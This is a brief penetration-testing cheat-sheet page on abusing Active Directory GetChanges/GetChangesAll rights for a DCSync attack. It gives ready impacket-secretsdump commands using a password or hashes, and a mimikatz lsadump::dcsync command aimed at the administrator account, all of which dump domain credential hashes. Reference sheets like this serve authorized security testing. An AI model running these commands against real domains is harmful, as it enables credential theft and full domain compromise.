---
title: "GetChanges/GetChangesAll"
date: 2024-7-9
tags: ["Dcsync", "Getchanges", "Getchangesall", "Secretsdump", "Active Driectory", "Windows"]
---

#### Abuse #1: DCSync Attack

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# With creds
impacket-secretsdump -just-dc '<USER>:<PASSWORD>@<TARGET>'
```

```console
# With hashes
impacket-secretsdump -hashes <HASH> -just-dc '<DOMAIN>/<USER>@<TARGET>'
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
.\mimikatz.exe 'lsadump::dcsync /domain:<DOMAIN> /user:administrator' exit
```

{{< /tabcontent >}}
